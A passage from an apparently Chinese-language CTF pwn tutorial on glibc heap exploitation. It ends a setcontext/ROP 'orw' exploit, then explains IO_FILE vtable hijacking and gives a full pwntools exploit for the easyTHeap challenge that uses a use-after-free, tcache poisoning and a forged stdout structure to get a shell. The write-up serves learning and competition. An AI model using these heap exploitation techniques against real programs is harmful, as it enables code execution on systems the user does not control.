class="number">0xfffffffff000</span></span><br><span class="line">    log.success(<span class="string">&#x27;heap base: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the fake_frame on heap</span></span><br><span class="line">    fake_frame_addr = heap_base + <span class="number">0x310</span> + <span class="number">0x10</span></span><br><span class="line">    fake_frame = SigreturnFrame()</span><br><span class="line">    fake_frame[<span class="string">&#x27;uc_stack.ss_size&#x27;</span>] = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">    fake_frame.rdi = <span class="number">0</span></span><br><span class="line">    fake_frame.rsi = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    fake_frame.rdx = <span class="number">0x200</span></span><br><span class="line">    fake_frame.rsp = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    fake_frame.rip = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    load(<span class="number">0</span>)</span><br><span class="line">    shoot(<span class="number">1</span>)</span><br><span class="line">    buy(<span class="number">0x100</span>, <span class="built_in">bytes</span>(fake_frame))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning with fastbin double free</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        buy(<span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    load(<span class="number">9</span>)</span><br><span class="line">    load(<span class="number">10</span>)</span><br><span class="line">    shoot(<span class="number">2</span>)</span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 9</span></span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 10</span></span><br><span class="line">    load(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        load(<span class="number">3</span> + i)</span><br><span class="line">    shoot(<span class="number">7</span>)</span><br><span class="line">    load(<span class="number">10</span>)</span><br><span class="line">    load(<span class="number">9</span>)</span><br><span class="line">    shoot(<span class="number">3</span>) <span class="comment"># double free in fastbin</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        buy(<span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># clear the tcache</span></span><br><span class="line">    buy(<span class="number">0x20</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>])) <span class="comment"># idx 9</span></span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">b&#x27;./flag\x00&#x27;</span>) <span class="comment"># idx 10, which we use to store the flag</span></span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 11, overlapping chunk with idx 9</span></span><br><span class="line">    buy(<span class="number">0x20</span>, p64(libc_base + <span class="number">0x154930</span>)) <span class="comment"># idx12, our fake chunk on __free_hook</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the setcontext with gadget chain</span></span><br><span class="line">    flag_addr = heap_base + <span class="number">0x570</span> + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(fake_frame_addr)<span class="comment"># rdi + 8 for the rdx, we set it to the addr of the fake frame</span></span><br><span class="line"></span><br><span class="line">    buy(<span class="number">0x100</span>, payload) <span class="comment"># idx 13</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the orw rop chain</span></span><br><span class="line">    pop_rdi_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">    pop_rsi_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rsi ; ret&#x27;</span>)).__next__()</span><br><span class="line">    pop_rdx_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdx ; ret&#x27;</span>)).__next__()</span><br><span class="line">    pop_rdx_pop_rbx_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdx ; pop rbx ; ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">    orw = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">4</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the flag</span></span><br><span class="line">    load(<span class="number">13</span>)</span><br><span class="line">    shoot(<span class="number">1</span>)</span><br><span class="line">    p.sendline(orw)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可获得flag</p>
<p><img src="https://i.loli.net/2021/02/10/CNypQMasthTbzK9.png" alt="image.png"></p>
<blockquote>
<p>有关setcontext()的利用见：<a target="_blank" rel="noopener" href="http://blog.eonew.cn/archives/993">setcontext 函数exploit - Ex个人博客</a></p>
</blockquote>
<blockquote>
<p>以及构造rop链时遇到了一个玄学问题…使用libc中的<code>pop rdx ; ret</code>的gadget会触发Segmentation Fault，只好改用<code>pop rdx ; pop rbx ; ret</code>的gadget来更改rdx寄存器的值…原因不明…</p>
</blockquote>
<h2 id="九、IO-FILE-exploit"><a href="#九、IO-FILE-exploit" class="headerlink" title="九、IO_FILE exploit"></a>九、IO_FILE exploit</h2><p>对于FILE结构体的利用也是CTF中的大热门之一，通过修改FILE结构体或是劫持vtable表等方式可以令攻击者十分方便地控制程序执行流</p>
<p>对于FILE结构体的相关定义见<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/io_file/introduction/">CTF WIKI</a></p>
<h3 id="vtable-hijack"><a href="#vtable-hijack" class="headerlink" title="vtable hijack"></a>vtable hijack</h3><p>对于每一个FILE结构体，其都有一个虚函数表，在通过FILE结构体实现各种输入输出功能时往往会调用其中的函数指针，那么我们不难想到，只要我们能够控制该虚函数表，就能通过FILE结构体相关的函数调用流程控制程序执行流</p>
<h4 id="例题：-V-amp-N2020-公开赛-easyTHeap-Use-After-Free-tcache-hijact-tcache-poisoning-one-gadget"><a href="#例题：-V-amp-N2020-公开赛-easyTHeap-Use-After-Free-tcache-hijact-tcache-poisoning-one-gadget" class="headerlink" title="例题：[V&amp;N2020 公开赛]easyTHeap - Use After Free + tcache hijact + tcache poisoning + one_gadget"></a>例题：[V&amp;N2020 公开赛]easyTHeap - Use After Free + tcache hijact + tcache poisoning + one_gadget</h4><p>惯例的<code>checksec</code>，保护全开</p>
<p><img src="https://i.loli.net/2021/01/25/3ApsgBYDW1kPvZq.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2021/01/25/VvSMXr1gkjswG8F.png" alt="image.png"></p>
<p>程序本身有着<strong>分配、编辑、打印、释放</strong>堆块的功能，算是功能比较齐全</p>
<p>但是程序本身限制了<strong>只能分配7次堆块，只能释放3次堆块</strong></p>
<p><img src="https://i.loli.net/2021/01/25/bh3nFx1AWiQLIpy.png" alt="image.png"></p>
<p>漏洞点在于free功能中<strong>没有将堆块指针置NULL，存在Use After Free漏洞</strong></p>
<p><img src="https://i.loli.net/2021/01/25/qnHTGlJfv78uzCU.png" alt="image.png"></p>
<p>虽然说在分配堆块的功能中并没有过于限制大小（0x100），但是题目所给的libc是有着tcache的2.27版本，需要通过unsorted bin泄露main_arena的地址我们至少需要释放8次堆块才能获得一个unsorted chunk，而我们仅被允许释放3次堆块</p>
<p>但是利用use after free我们是可以泄露堆基址的，而<strong>用以管理tcache的tcache_perthread_struct结构体本身便是由一个chunk实现的</strong></p>
<p>libc2.27 中没有对 tcache double free 的检查，故在这里我们可以<strong>通过tcache double free结合use after free泄漏出堆基址后伪造一个位于tcache_perthread_struct结构体附近的fake chunk以劫持tcache_perthread_struct结构体修改tcache_perthread_struct-&gt;counts中对应index的值为7后释放chunk便可以获得unsorted bin以泄露libc基址</strong></p>
<p>惯例的pwndbg动态调试，我们可以得到tcache结构体的size，也就得到了偏移</p>
<p><img src="https://i.loli.net/2021/01/25/ceBImgTw97HbUxh.png" alt="image.png"></p>
<p>需要注意的是在free功能中会将其保存的chunk size置0， 因而我们需要<strong>重新将这个chunk申请回来后才能继续编辑</strong></p>
<p>这道题最经典的做法就是套板子，劫持__malloc_hook为one_gadget以get shell</p>
<p>但是除了劫持__malloc_hook为one_gadget之外，我们也可以通过劫持_IO_2_1_stdout_中的vtable表的方式调用one_gadget</p>
<p>观察到程序中在我们edit之后会调用puts()函数</p>
<p><img src="https://i.loli.net/2021/01/28/NlbrxUYMTpaohFj.png" alt="image.png"></p>
<p>puts()函数定义于libio&#x2F;ioputs.c中，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  <span class="type">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">weak_alias (_IO_puts, <span class="built_in">puts</span>)</span><br><span class="line">libc_hidden_def (_IO_puts)</span><br></pre></td></tr></table></figure>

<p>观察到其会使用宏<code>_IO_sputn</code>，该宏定义于libio&#x2F;libioP.c中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br></pre></td></tr></table></figure>

<p>套娃宏，跟进：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_OFFSET 0</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br></pre></td></tr></table></figure>

<p>即<strong>puts函数最终会调用vtable表中的</strong><code>__xsputn</code><strong>函数指针</strong>，gdb调试我们可以知道其相对表头偏移应当为<code>0x30</code>（64位下）</p>
<p><img src="https://i.loli.net/2021/01/28/nDQR7vLuyY92sK6.png" alt="image.png"></p>
<p>由于<strong>自libc2.24始增加了对vtable表的合法性检测，故我们只能执行位于合法vtable表范围内的函数指针</strong></p>
<p>考虑到<strong>_IO_str_finish函数会将FILE指针 + 0xE8的位置作为一个函数指针执行</strong>，故我们选择修改_IO_2_1_stdout_的vtable表至特定位置以<strong>调用_IO_str_finish函数</strong></p>
<p>表_IO_str_jumps中存在着我们想要利用的_IO_str_finish函数的指针，且该表是一个合法vtable表，故只要我们<strong>将stdout的vtable表劫持到_IO_str_finish附近即可成功调用_IO_str_finish函数</strong></p>
<p><img src="https://i.loli.net/2021/01/28/8za9eybLr15CQdn.png" alt="image.png"></p>
<p>由_IO_jump_t结构体的结构我们不难计算出fake vtable的位置应当为<strong>_IO_str_jumps - 0x28</strong></p>
<p>劫持vtable表后在_IO_2_1_stdout_ + 0xE8的位置放上one_gadget，即可在程序调用puts函数时get shell</p>
<p>通过gdb调试可以帮助我们更好地构造fake _IO_2_1_stdout_结构体</p>
<p><img src="https://i.loli.net/2021/01/28/1UL7f9tYpJvDQun.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/01/28/jJmV5HoTubeZGc9.png" alt="image.png"></p>
<p>需要注意的一点是有少部分符号无法直接通过sym字典获得，我们在这里采用其相对偏移以计算其真实地址，详见注释</p>
<p><img src="https://i.loli.net/2021/01/28/2VYftpBeUyLrFa6.png" alt="image.png"></p>
<p>故最后构造的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./vn_pwn_easyTHeap&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,26233)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./vn_pwn_easyTHeap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># tcache double free</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx0</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx1</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the heap base</span></span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    heap_base = heap_leak - <span class="number">0x260</span></span><br><span class="line">    log.info(<span class="string">&#x27;heap base leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning, hijack the tcache struct</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx2</span></span><br><span class="line">    edit(<span class="number">2</span>, p64(heap_base + <span class="number">0x10</span>))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx3</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx4, our fake chunk</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">b&quot;\x07&quot;</span>.rjust(<span class="number">0x10</span>, <span class="string">b&quot;\x07&quot;</span>)) <span class="comment"># all full</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc base</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the fake file structure</span></span><br><span class="line">    fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFBAD2886</span>) <span class="comment"># _flags, an magic word, we need to (0xFBAD2887 &amp; (~0x1)) to clear the _IO_USER_BUF flag to pass the check in _IO_str_finish</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">131</span>) * <span class="number">7</span> <span class="comment"># from _IO_read_ptr to _IO_buf_base</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">132</span>) <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">4</span> <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]) <span class="comment"># the FILE chain ptr</span></span><br><span class="line">    fake_file += p32(<span class="number">1</span>) <span class="comment"># _fileno for stdout is 1</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># _flags2, usually 0</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _old_offset, -1</span></span><br><span class="line">    fake_file += p16(<span class="number">0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\x00&quot;</span> <span class="comment"># _vtable_offset</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\n&quot;</span> <span class="comment"># _shortbuf[1]</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># padding</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x1e20</span>) <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _offset, -1</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0xe20</span>) <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">    fake_file += p32(<span class="number">0xFFFFFFFF</span>) <span class="comment"># _mode, -1</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\x00&quot;</span> * <span class="number">19</span> <span class="comment"># _unused2</span></span><br><span class="line">    fake_file = fake_file.ljust(<span class="number">0xD8</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># adjust to vtable</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] + <span class="number">0xc0</span> - <span class="number">0x28</span>) + p64(<span class="number">0</span>) + p64(libc_base + one_gadget) <span class="comment"># set the vtable to _IO_str_jumps - 0x28 and set the _IO_2_1_stdout_ + 0xe8 to one_gadget</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning, hijack the _IO_2_1_stdout and its vtable</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">b&quot;\x10&quot;</span>.rjust(<span class="number">0x10</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(<span class="number">0</span>) * <span class="number">21</span> + p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx5, our fake chunk</span></span><br><span class="line">    edit(<span class="number">5</span>, fake_file)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/01/28/pOolNzjyAbwJTFR.png" alt="image.png"></p>
<blockquote>
<h4 id="IO-FILE-plus结构体中-vtable-相对偏移"><a href="#IO-FILE-plus结构体中-vtable-相对偏移" class="headerlink" title="_IO_FILE_plus结构体中 vtable 相对偏移"></a>_IO_FILE_plus结构体中 vtable 相对偏移</h4><blockquote>
<p> 在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8 </p>
<p> <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/io_file/introduction/">ctf-wiki: FILE structure</a></p>
</blockquote>
<h4 id="vtable-合法性检测-start-from-glibc2-24"><a href="#vtable-合法性检测-start-from-glibc2-24" class="headerlink" title="vtable 合法性检测(start from glibc2.24)"></a>vtable 合法性检测(start from glibc2.24)</h4><p>自从glibc2.24版本起便增加了对于vtable的检测，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">section.  */</span></span><br><span class="line"><span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line"><span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line"><span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line"><span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment"> slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">_IO_vtable_check ();</span><br><span class="line"><span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gdb调试可知这个section_length的长度为3432（0xd68）：</p>
<p><img src="https://i.loli.net/2021/01/26/1P62e8KHUgOCR5i.png" alt="image.png"></p>
<p>由此，我们所构造的fake vtable的位置受到了一定的限制，即只能在<code>__start___libc_IO_vtables</code>往后0xd68字节的范围内</p>
<h4 id="vtable表劫持姿势-under-glibc2-28"><a href="#vtable表劫持姿势-under-glibc2-28" class="headerlink" title="vtable表劫持姿势(under glibc2.28)"></a>vtable表劫持姿势(under glibc2.28)</h4><p>在glibc2.28往前的版本中<strong>_IO_str_finish函数会将_IO_2_1_stdout_ + 0xE8的位置作为一个函数指针执行</strong>，故我们通常考虑在这个位置放上我们想要执行的指令地址（如one_gadget）并将vtable表劫持到适合的位置以执行<code>_IO_str_finish()</code>函数</p>
<p>通常情况下，我们考虑<strong>劫持_IO_2_1_stdout_并修改其vtable表至表_IO_str_jumps附近</strong>，该vtable表定义于libio&#x2F;sstrops.c中，如下：</p>
